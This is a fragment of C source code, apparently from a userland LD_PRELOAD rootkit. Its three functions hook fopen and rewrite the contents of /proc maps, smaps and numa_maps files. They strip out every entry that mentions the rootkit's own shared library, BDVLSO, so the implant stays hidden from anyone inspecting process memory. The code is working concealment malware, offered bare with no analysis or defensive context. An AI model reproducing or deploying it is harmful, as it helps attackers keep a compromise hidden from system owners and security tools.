FILE *forge_maps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!strstr(buf, BDVLSO))
            fputs(buf, o);

    memset(buf, 0, strlen(buf));
    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_smaps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];
    int i = 0;

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL){
        if(i > 0) i++;
        if(i > 15) i = 0;
        if(strstr(buf, BDVLSO)) i = 1;
        if(i == 0) fputs(buf, o);
    }

    memset(buf, 0, strlen(buf));
    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_numamaps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!strstr(buf, BDVLSO))
            fputs(buf, o);

    memset(buf, 0, strlen(buf));
    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}
